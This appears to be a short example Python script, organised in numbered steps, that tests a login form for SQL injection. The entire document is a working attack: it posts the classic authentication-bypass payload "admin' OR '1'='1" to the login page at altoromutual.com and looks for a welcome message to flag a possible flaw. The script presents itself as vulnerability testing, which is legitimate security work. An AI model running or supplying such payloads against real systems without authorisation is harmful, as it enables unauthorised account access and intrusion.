import requests
from urllib import parse

# Step 1: Analyze the application for SQL Injection vulnerabilities
# This step would require manual analysis, as there's no direct way to automate this process with a script.
# You would need to examine the HTML, JavaScript, and any visible scripts. Look for input fields that accept user input (login forms, search boxes) and observe URL parameters.
# For the sake of this example, let's assume we've found an input field in a form where SQL injection might be possible.

# Step 2: Choose an SQL Injection Payload
# We will use a common payload that is often used to test for SQL injection vulnerabilities.
payload = {
    'username': 'admin\' OR \'1\'=\'1',
    'password': ''
}

# Step 3: Prepare the Payload
url_encoded_data = parse.urlencode(payload)

# Step 4: Send the HTTP POST Request
response = requests.post('http://altoromutual.com/login', data=url_encoded_data)

# Step 5: Check the Response
if "Welcome" in response.text or "Logged in successfully" in response.text:
    print("Potential SQL Injection vulnerability found!")
else:
    print("No obvious SQL Injection vulnerability detected.")